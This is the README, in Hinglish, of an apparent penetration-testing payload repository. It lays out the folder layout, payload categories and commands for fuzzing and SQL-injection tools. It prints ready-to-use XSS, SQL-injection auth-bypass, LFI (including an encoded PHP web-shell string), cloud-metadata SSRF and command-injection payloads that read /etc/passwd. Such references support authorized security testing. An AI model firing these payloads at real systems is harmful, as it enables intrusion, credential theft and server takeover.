# 💣 Payloads Everything

> **Ek comprehensive collection of payloads, wordlists, fuzzing strings, and attack vectors — penetration testers, bug bounty hunters, aur security researchers ke liye.**

---

## 📋 Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Directory Structure](#directory-structure)
- [Categories](#categories)
- [Installation & Usage](#installation--usage)
- [Payload Types](#payload-types)
- [Tools Integration](#tools-integration)
- [Contributing](#contributing)
- [Disclaimer](#disclaimer)
- [License](#license)

---

## 🧐 Introduction

**Payloads Everything** ek open-source repository hai jo security professionals ke liye sabse common aur advanced attack payloads ko ek jagah collect karta hai. Is repository ka maksad ethical hacking, CTF competitions, aur authorized penetration testing ko aasan banana hai.

Yeh repository regularly update hoti hai — nayi vulnerabilities, bypass techniques, aur real-world tested payloads ke saath.

---

## ✨ Features

- ✅ 10,000+ curated payloads across multiple categories
- ✅ Real-world tested & CTF-proven strings
- ✅ WAF bypass techniques included
- ✅ Organized category-wise for easy navigation
- ✅ Tool-ready format (Burp Suite, ffuf, sqlmap, etc.)
- ✅ Regular updates with new CVEs & techniques
- ✅ Beginner-friendly with clear documentation

---

## 📁 Directory Structure

```
payloads-everything/
├── README.md
├── web/
│   ├── xss/
│   │   ├── basic.txt
│   │   ├── advanced.txt
│   │   ├── waf-bypass.txt
│   │   └── polyglots.txt
│   ├── sqli/
│   │   ├── mysql.txt
│   │   ├── mssql.txt
│   │   ├── oracle.txt
│   │   ├── postgresql.txt
│   │   ├── blind.txt
│   │   └── time-based.txt
│   ├── lfi-rfi/
│   │   ├── linux.txt
│   │   ├── windows.txt
│   │   └── wrappers.txt
│   ├── ssrf/
│   │   ├── basic.txt
│   │   ├── cloud-metadata.txt
│   │   └── bypass.txt
│   ├── ssti/
│   │   ├── jinja2.txt
│   │   ├── twig.txt
│   │   └── freemarker.txt
│   ├── open-redirect/
│   ├── xxe/
│   ├── csrf/
│   └── command-injection/
├── network/
│   ├── ports.txt
│   ├── protocols.txt
│   └── scanners/
├── fuzzing/
│   ├── directories.txt
│   ├── files.txt
│   ├── params.txt
│   └── extensions.txt
├── wordlists/
│   ├── usernames.txt
│   ├── passwords/
│   │   ├── common.txt
│   │   ├── rockyou-top1000.txt
│   │   └── default-creds.txt
│   └── subdomains.txt
├── api/
│   ├── endpoints.txt
│   ├── headers.txt
│   └── graphql.txt
├── cloud/
│   ├── aws/
│   ├── gcp/
│   └── azure/
└── misc/
    ├── polyglots.txt
    ├── encodings.txt
    └── special-chars.txt
```

---

## 🗂️ Categories

### 🌐 Web Application Attacks

| Category | Description |
|----------|-------------|
| **XSS** | Cross-Site Scripting — reflected, stored, DOM-based |
| **SQLi** | SQL Injection — error-based, blind, time-based, UNION |
| **LFI/RFI** | Local & Remote File Inclusion |
| **SSRF** | Server-Side Request Forgery |
| **SSTI** | Server-Side Template Injection |
| **XXE** | XML External Entity Injection |
| **CSRF** | Cross-Site Request Forgery tokens/bypasses |
| **CMDi** | Command Injection — Linux & Windows |
| **Open Redirect** | URL redirection bypasses |

### 🔐 Authentication & Authorization

| Category | Description |
|----------|-------------|
| **Brute Force** | Username & password lists |
| **Default Creds** | Common default credentials |
| **JWT Attacks** | Weak secrets, algorithm confusion |
| **OAuth Bypasses** | Redirect URI manipulation |

### 🔍 Fuzzing & Discovery

| Category | Description |
|----------|-------------|
| **Directory Fuzzing** | Hidden paths aur endpoints |
| **Parameter Fuzzing** | Hidden HTTP parameters |
| **Subdomain Enum** | Subdomain discovery wordlists |
| **File Extensions** | Backup files, config leaks |

### ☁️ Cloud & Infrastructure

| Category | Description |
|----------|-------------|
| **AWS** | S3 buckets, metadata endpoints |
| **GCP** | Metadata service payloads |
| **Azure** | SSRF via Azure metadata |

---

## ⚙️ Installation & Usage

### Clone karo

```bash
git clone https://github.com/yourusername/payloads-everything.git
cd payloads-everything
```

### Direct Use with Tools

#### ffuf ke saath (Directory Fuzzing)
```bash
ffuf -u https://target.com/FUZZ -w fuzzing/directories.txt -mc 200,301,302
```

#### sqlmap ke saath (SQLi)
```bash
sqlmap -u "https://target.com/page?id=1" --tamper=space2comment
# Ya custom payload file use karo:
sqlmap -u "https://target.com/" --data="user=*" -p user
```

#### Burp Suite ke saath (XSS)
```
Intruder > Payload Sets > Load from File > web/xss/advanced.txt
```

#### curl ke saath (SSRF Testing)
```bash
curl -s "https://target.com/fetch?url=PAYLOAD" \
  --data-urlencode "url=http://169.254.169.254/latest/meta-data/"
```

#### wfuzz ke saath
```bash
wfuzz -c -z file,wordlists/usernames.txt \
  -d "username=FUZZ&password=admin" \
  https://target.com/login
```

---

## 💉 Payload Types

### XSS Examples

```
Basic:         <script>alert(1)</script>
Event-based:   <img src=x onerror=alert(1)>
WAF Bypass:    <ScRiPt>alert`1`</ScRiPt>
Polyglot:      jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//
DOM-based:     #"><img src=/ onerror=alert(document.domain)>
```

### SQL Injection Examples

```sql
-- Error-Based
' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))-- -

-- Union-Based
' UNION SELECT null,table_name,null FROM information_schema.tables-- -

-- Time-Based Blind
'; IF (1=1) WAITFOR DELAY '0:0:5'--

-- Auth Bypass
admin'-- -
' OR '1'='1
```

### LFI Examples

```
/etc/passwd
../../../../etc/passwd
....//....//etc/passwd
php://filter/convert.base64-encode/resource=index.php
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7Pz4=
```

### SSRF Examples

```
http://169.254.169.254/latest/meta-data/     # AWS
http://metadata.google.internal/              # GCP
http://169.254.169.254/metadata/v1/           # DigitalOcean
http://localhost/admin
http://0.0.0.0:8080
http://[::1]/
```

### Command Injection Examples

```bash
# Linux
; id
| id
`id`
$(id)
; cat /etc/passwd

# Windows
& whoami
| whoami
; dir c:\
```

---

## 🛠️ Tools Integration

| Tool | Use Case | Compatible Payloads |
|------|----------|---------------------|
| **Burp Suite** | Web app testing | XSS, SQLi, SSRF, all web |
| **ffuf** | Fuzzing | Directories, params, subdomains |
| **sqlmap** | SQL Injection | SQLi payloads |
| **nuclei** | Vuln scanning | Template-based |
| **wfuzz** | Web fuzzing | All wordlists |
| **hydra** | Brute forcing | Credentials |
| **gobuster** | Dir/subdomain | Fuzzing wordlists |
| **nmap** | Network scanning | Port lists |

---

## 🤝 Contributing

Contributions welcome hain! Naye payloads add karne ke liye:

1. **Fork** karo repository
2. **Branch** banao: `git checkout -b feature/new-payloads`
3. Payload file add/update karo
4. **Commit**: `git commit -m "Add: SSTI Jinja2 bypass payloads"`
5. **Push**: `git push origin feature/new-payloads`
6. **Pull Request** open karo

### Contribution Guidelines

- Payloads real-world tested ya well-known sources se hone chahiye
- Source/reference include karo (CVE, blog, paper)
- Duplicate payloads avoid karo
- Category ke hisaab se sahi folder mein rakho
- Ek line = ek payload format follow karo

---

## ⚠️ Disclaimer

> **SIRF AUTHORIZED SYSTEMS PE USE KARO!**
>
> Is repository ka content sirf **ethical hacking**, **CTF competitions**, aur **authorized penetration testing** ke liye hai. Bina permission ke kisi bhi system pe in payloads ka use karna **illegal** hai aur computer crime laws ka violation hai.
>
> Repository maintainers kisi bhi misuse ke liye **responsible nahi hain**. Apne desh ke cyber laws follow karo.

---

## 📜 License

MIT License — Free to use for educational and ethical purposes.

---

## 🌟 Star karo agar helpful laga!

```
★ Star → Watch → Fork → Contribute
```

Made with ❤️ by the security community — for the security community.
